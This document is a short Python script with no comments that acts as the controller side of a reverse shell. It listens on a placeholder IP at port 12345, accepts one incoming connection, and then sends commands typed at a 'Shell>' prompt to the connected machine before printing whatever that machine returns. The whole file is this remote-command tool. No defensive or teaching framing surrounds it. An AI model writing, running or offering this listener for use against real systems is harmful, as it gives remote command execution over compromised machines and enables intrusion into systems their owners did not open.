import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("your ip", 12345)) 
s.listen(1)
print("Listening...")

conn, ip = s.accept()
print(f"Connected to {ip}")

while True:
    command = input("Shell> ")
    if command == "exit":
        conn.send(b"exit")
        break
    conn.send(command.encode())
    response = conn.recv(1024).decode()
    print(response)

conn.close()
s.close()
